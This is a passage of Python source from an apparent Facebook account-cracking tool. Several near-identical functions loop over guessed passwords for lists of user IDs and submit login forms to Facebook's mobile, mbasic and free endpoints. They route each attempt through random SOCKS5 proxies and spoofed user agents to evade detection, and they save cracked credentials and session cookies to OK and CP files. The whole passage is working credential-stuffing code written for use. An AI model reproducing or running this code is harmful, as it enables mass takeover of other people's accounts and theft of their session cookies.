			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fmobile.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D1722713787887984%26cbt%3D1676027180738%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df363b0a73c19804%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%26client_id%3D1722713787887984%26display%3Dtouch%26domain%3Dwww.bilibili.tv%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Fid%252F%26locale%3Den_US%26logger_id%3Df3d20d066ff6254%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df14522bfee17014%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%2526frame%253Df185d306bc50d08%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df14522bfee17014%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ff20019dbd9069f8%26relation%3Dopener%26frame%3Df185d306bc50d08%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login.php?skip_api_login=1&api_key=1722713787887984&kid_directed_site=0&app_id=1722713787887984&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D1722713787887984%26cbt%3D1676027180738%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df363b0a73c19804%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%26client_id%3D1722713787887984%26display%3Dtouch%26domain%3Dwww.bilibili.tv%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Fid%252F%26locale%3Den_US%26logger_id%3Df3d20d066ff6254%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df14522bfee17014%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%2526frame%253Df185d306bc50d08%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df14522bfee17014%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ff20019dbd9069f8%26relation%3Dopener%26frame%3Df185d306bc50d08%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"[bold yellow]{idf}|{pw}")
					tree.add(f"[bold yellow]{ua}")
					cetak(tree) 
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"[bold yellow]{idf}|{pw}")
					tree.add(f"[bold yellow]{ua}")
					cetak(tree) 
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree(f"  ")
					tree.add(f"[bold green]{idf}|{pw}")
					tree.add(f"[bold green]{kuki}\n")
					cetak(tree) 
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree(f"  ")
					tree.add(f"[bold green]{idf}|{pw}")
					tree.add(f"[bold green]{kuki}\n")
					cetak(tree) 
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#-----------------------[ METHOD REGULER ]--------------------#
def reguler1(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}Mobile{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'm.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://m.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://m.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"[bold yellow]{idf}|{pw}")
					tree.add(f"[bold yellow]{ua}")
					cetak(tree) 
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"[bold yellow]{idf}|{pw}")
					tree.add(f"[bold yellow]{ua}")
					cetak(tree) 
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree(f"  ")
					tree.add(f"[bold green]{idf}|{pw}")
					tree.add(f"[bold green]{kuki}\n")
					cetak(tree) 
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree(f"  ")
					tree.add(f"[bold green]{idf}|{pw}")
					tree.add(f"[bold green]{kuki}\n")
					cetak(tree) 
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def reguler2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}Mbasic{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://mbasic.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'mbasic.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://mbasic.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://mbasic.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"[bold yellow]{idf}|{pw}")
					tree.add(f"[bold yellow]{ua}")
					cetak(tree) 
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"[bold yellow]{idf}|{pw}")
					tree.add(f"[bold yellow]{ua}")
					cetak(tree) 
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree(f"  ")
					tree.add(f"[bold green]{idf}|{pw}")
					tree.add(f"[bold green]{kuki}\n")
					cetak(tree) 
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree(f"  ")
					tree.add(f"[bold green]{idf}|{pw}")
					tree.add(f"[bold green]{kuki}\n")
					cetak(tree) 
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
def reguler3(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}Free{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host":"free.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://free.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'free.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://free.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://free.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://free.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"[bold yellow]{idf}|{pw}")
					tree.add(f"[bold yellow]{ua}")
					cetak(tree) 
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"[bold yellow]{idf}|{pw}")
					tree.add(f"[bold yellow]{ua}")
					cetak(tree) 
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree(f"  ")
					tree.add(f"[bold green]{idf}|{pw}")
					tree.add(f"[bold green]{kuki}\n")
					cetak(tree) 
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree(f"  ")
					tree.add(f"[bold green]{idf}|{pw}")
					tree.add(f"[bold green]{kuki}\n")
					cetak(tree) 
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#-----------------------[ METODE ASYNC ]--------------------#
def kontol(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}Async{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=206428089508143&kid_directed_site=0&app_id=206428089508143&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D206428089508143%26redirect_uri%3Dhttps%253A%252F%252Fwww.zalora.co.id%252Fcustomer%252Fsocialconnect%252Fendpoint%253Fhauth_done%253DFacebook%26scope%3Demail%252Cuser_birthday%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0c67b520-a187-48a6-8125-3256fe975775%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.zalora.co.id%2Fcustomer%2Fsocialconnect%2Fendpoint%3Fhauth_done%3DFacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.facebook.com/v8.0/dialog/oauth?response_type=code%2Cgranted_scopes&client_id=1239138353201716&redirect_uri=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler&state=AMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB&scope=public_profile%2Cemail&display=popup&ret=login&fbapp_pres=0&logger_id=087a364c-3d69-45b4-a55b-047dae50317c&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"[bold yellow]{idf}|{pw}")
					tree.add(f"[bold yellow]{ua}")
					cetak(tree) 
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"[bold yellow]{idf}|{pw}")
					tree.add(f"[bold yellow]{ua}")
					cetak(tree) 
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree(f"  ")
					tree.add(f"[bold green]{idf}|{pw}")
					tree.add(f"[bold green]{kuki}\n")
					cetak(tree) 
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree(f"  ")
					tree.add(f"[bold green]{idf}|{pw}")
					tree.add(f"[bold green]{kuki}\n")
					cetak(tree) 
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#-----------------------[ METODE B-API ]--------------------#
def bapi(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}B-Api{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=793139305026776&kid_directed_site=0&app_id=793139305026776&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D793139305026776%26redirect_uri%3Dhttps%253A%252F%252Fmuyu2019.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db0a1bc78-04e0-4998-b19b-3a18e7643195%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmuyu2019.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v16.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'ASSqfFh8929p35Kn6/R+D8OSctQbVgiX+Pxpn8s5dImzlZcynOPPu9rnz5V0PKDXfbEwqT0VshbByU46SqsrXQ==','content-length': '332','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=793139305026776&kid_directed_site=0&app_id=793139305026776&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D793139305026776%26redirect_uri%3Dhttps%253A%252F%252Fmuyu2019.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db0a1bc78-04e0-4998-b19b-3a18e7643195%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmuyu2019.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
